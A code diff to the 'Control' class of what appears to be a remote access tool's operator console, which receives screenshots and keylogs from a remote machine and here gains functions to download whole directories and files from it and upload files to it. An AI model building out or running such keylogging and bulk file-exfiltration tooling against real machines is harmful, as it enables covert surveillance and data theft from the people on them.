@@ -215,7 +215,7 @@ class Control:
 
             data = self.es.recvall(buffer)
 
-            file = f"{os.getcwd()}{os.path.sep}{time.strftime('scrn_%Y%m%d_%H%M%S.png')}"
+            file = f"{os.getcwd()}/{time.strftime('scrn_%Y%m%d_%H%M%S.png')}"
 
             try:
                 with open(file, "wb") as objPic:
@@ -253,7 +253,7 @@ class Control:
             keylog = self.es.recvall(rsp["value"]["buffer"]).decode()
 
             try:
-                file_name = f"{os.getcwd()}{os.path.sep}{time.strftime('keylog_%Y%m%d_%H%M%S.png')}"
+                file_name = f"{os.getcwd()}/{time.strftime('keylog_%Y%m%d_%H%M%S.png')}"
                 with open(file_name, "w") as _file:
                     _file.write(keylog)
                 self.logger.info(f"Saved to {file_name}")
@@ -261,14 +261,94 @@ class Control:
                 self.logger.error(f"Error writing to file {e}")
                 print(keylog)
 
-    def receive_file(self):
-        file = os.path.normpath(helper.remove_quotes(input("Target file: ")))
-        out_file = os.path.normpath(helper.remove_quotes(input("Output File: ")))
+    def download_dir(self):
+        input_in = input("Target directory: ")
+        input_out = input("Output directory: ")
 
-        if file == "" or out_file == "":  # if the user left an input blank
+        if input_in == "" or input_out == "":  # if the user left an input blank
             return
 
-        self.es.send_json(CLIENT_RECV_FILE, file)
+        _in = helper.remove_quotes(input_in)
+        _out = os.path.normpath(helper.remove_quotes(input_out))
+
+        if not os.path.isdir(_out):
+            try:
+                os.makedirs(_out)
+            except OSError:
+                self.logger.error(f"Could not create local dir: {_out}")
+                return
+        else:
+            if not os.access(_out, os.W_OK):
+                self.logger.error(f"No write access to local dir: {_out}")
+                return
+
+            if len(os.listdir(_out)) != 0:
+                # prevent overriding existing files
+                self.logger.error(f"Local directory {_out} not empty")
+                return
+
+        self.es.send_json(CLIENT_DWNL_DIR, _in)
+
+        file_count = 0
+        bytes_recv = 0
+        bytes_sent = 0
+
+        while True:
+            rsp = self.es.recv_json()
+
+            if rsp["key"] == SERVER_UPLOAD_DIR:
+                buffer = rsp["value"]["buffer"]
+
+                file_path = rsp['value']['value']['path']
+                size = rsp['value']['value']['size']
+                progress = rsp['value']['value']['progress']
+
+                self.logger.info(f"{str(progress)}% - {file_path}")
+
+                file_out_path = os.path.join(_out, file_path)
+                file_data = self.es.recvall(buffer)
+
+                if not os.path.isdir(os.path.dirname(file_out_path)):
+                    os.makedirs(os.path.dirname(file_out_path))
+
+                try:
+                    with open(file_out_path, "wb") as fout:
+                        fout.write(file_data)
+
+                    # self.logger.info(f"Total bytes received: {len(file_data)} bytes")
+                except Exception as e:
+                    self.logger.error(f"Error writing to file {e}")
+                    continue
+
+                file_count += 1
+                bytes_recv += len(file_data)
+                bytes_sent += size
+
+            elif rsp["key"] == ERROR:  # don't exit on error, try again with next file in dir
+                self.logger.error(rsp["value"])
+
+            elif rsp["key"] == SERVER_UPLOAD_DIR_DONE:
+                if rsp["value"] is not None:
+                    self.logger.error(rsp["value"])
+                else:
+                    self.logger.info(f"Total files received: {file_count}")
+                    self.logger.info(f"Total bytes sent: {bytes_sent}")
+                    self.logger.info(f"Total bytes received: {bytes_recv}")
+                break
+
+            self.es.send_json(SUCCESS)
+
+    def download_file(self):
+        input_in = input("Target file: ")
+        input_out = input("Output file: ")
+
+        if input_in == "" or input_out == "":  # if the user left an input blank
+            return
+
+        _in = helper.remove_quotes(input_in)
+        _out = os.path.normpath(helper.remove_quotes(input_out))
+
+        self.es.send_json(CLIENT_DWNL_FILE, _in)
 
         rsp = self.es.recv_json()
 
@@ -280,7 +360,7 @@ class Control:
             file_data = self.es.recvall(buffer)
 
             try:
-                with open(out_file, "wb") as _file:
+                with open(_out, "wb") as _file:
                     _file.write(file_data)
             except Exception as e:
                 self.logger.error(f"Error writing to file {e}")
@@ -291,17 +371,14 @@ class Control:
         elif rsp["key"] == ERROR:
             self.logger.error(rsp["value"])
 
-    def send_file(self):
-        file = os.path.normpath(helper.remove_quotes(input("File to send: ")))
+    def upload_file(self):
+        file = os.path.normpath(helper.remove_quotes(input("Local file: ")))
 
         if not os.path.isfile(file):
             self.logger.error(f"File {file} not found")
             return
 
-        out_file = os.path.normpath(helper.remove_quotes(input("Output File: ")))
-
-        if out_file == "" or file == "":  # if the input is blank
-            return
+        out_file = helper.remove_quotes(input("Output File: "))
 
         try:
             with open(file, "rb") as _file:
